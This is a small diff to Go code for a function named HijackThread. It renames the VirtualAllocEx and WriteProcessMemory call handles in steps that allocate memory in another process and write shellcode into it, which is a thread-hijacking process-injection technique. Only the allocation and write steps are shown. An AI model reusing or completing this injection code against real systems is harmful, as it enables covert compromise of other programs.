@@ -35,7 +35,7 @@ func HijackThread(targetProcessID uint32, targetThreadID uint32, targetAddress u
 	}
 
 	// Allocate memory in the target process
-	addr, _, err := ProcVirtualAllocEx.Call(
+	addr, _, err := VirtualAllocEx.Call(
 		uintptr(processHandle),
 		0,
 		uintptr(len(shellcode)),
@@ -47,7 +47,7 @@ func HijackThread(targetProcessID uint32, targetThreadID uint32, targetAddress u
 	}
 
 	// Write the shellcode to the allocated memory
-	_, _, err = ProcWriteProcessMemory.Call(
+	_, _, err = WriteProcessMemory.Call(
 		uintptr(processHandle),
 		addr,
 		uintptr(unsafe.Pointer(&shellcode[0])),
